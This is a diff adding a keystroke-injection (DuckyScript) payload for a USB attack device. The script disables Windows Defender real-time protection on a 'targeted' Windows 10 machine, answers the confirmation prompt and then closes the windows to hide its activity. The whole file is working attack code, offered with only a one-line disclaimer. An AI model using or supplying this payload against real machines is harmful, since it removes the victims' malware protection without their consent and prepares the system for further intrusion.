@@ -1,0 +1,43 @@
+REM Author      : https://github.com/TheTeasel
+REM Description : Disable Windows Defender on Windows 10
+REM             : You may want to change the DELAY depending on the speed of the targeted machine
+REM             PLEASE DO NOT USE THIS SCRIPT FOR HARMFUL PURPOSES
+DELAY 500
+REM Minimize the USB drive folder
+ALT SPACE n
+REM Open Windows Defender settings
+CTRL ESC
+DELAY 1000
+STRING Windows Defender Settings
+DELAY 100
+ENTER
+REM Navigate to realtime protection and disable it
+DELAY 500
+ENTER
+DELAY 500
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+ENTER
+DELAY 500
+SPACE
+DELAY 500
+LEFT
+DELAY 500
+ENTER
+REM Close Settings
+DELAY 500
+ALT SPACE c
+REM Close opened USB directory
+DELAY 300
+ALT TAB
+
+DELAY 500
+ALT SPACE c
+
